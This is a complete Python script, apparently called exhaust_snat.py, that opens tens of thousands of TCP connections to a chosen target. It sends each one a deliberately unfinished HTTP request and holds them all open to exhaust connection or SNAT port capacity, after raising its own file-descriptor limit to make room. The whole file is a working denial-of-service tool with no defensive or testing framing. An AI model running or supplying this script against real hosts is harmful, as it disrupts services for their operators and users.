import socket
import sys
import time
import resource
import threading

# Usage: python3 exhaust_snat.py <TARGET_IP> <PORT> <CONNECTIONS>

def set_limits():
    # Increase the number of open files allowed
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    print(f"Current limits: soft={soft}, hard={hard}")
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
        print(f"New limits: {resource.getrlimit(resource.RLIMIT_NOFILE)}")
    except Exception as e:
        print(f"Failed to set limits: {e}")

def connect_and_hold(target_ip, target_port, count):
    sockets = []
    print(f"Attempting to establish {count} connections to {target_ip}:{target_port}...")
    
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            # Send partial request to ensure backend sees it as active
            s.send(b"GET / HTTP/1.1\r\nHost: localhost\r\n")
            sockets.append(s)
            
            if i % 500 == 0:
                print(f"Established {i} connections...")
                sys.stdout.flush()
                
        except OSError as e:
            print(f"Error at connection {i}: {e}")
            # If we hit address in use or other limits, stop trying to add more
            if e.errno == 99 or e.errno == 24: # Cannot assign requested address or Too many open files
                print("Hit system limit.")
                break
            time.sleep(0.1)
        except Exception as e:
            print(f"Unexpected error: {e}")
            break
            
    print(f"Finished. Holding {len(sockets)} connections open.")
    print("Press Ctrl+C to stop.")
    
    # Keep them alive
    while True:
        time.sleep(10)
        # Optionally send keep-alive data, but just holding the socket open is usually enough for TCP
        # To be safe against idle timeouts:
        # for s in sockets:
        #     try:
        #         s.send(b"X-Keep: 1\r\n")
        #     except:
        #         pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <TARGET_IP> [PORT] [CONNECTIONS]")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    conns = int(sys.argv[3]) if len(sys.argv) > 3 else 60000
    
    set_limits()
    connect_and_hold(target_ip, port, conns)
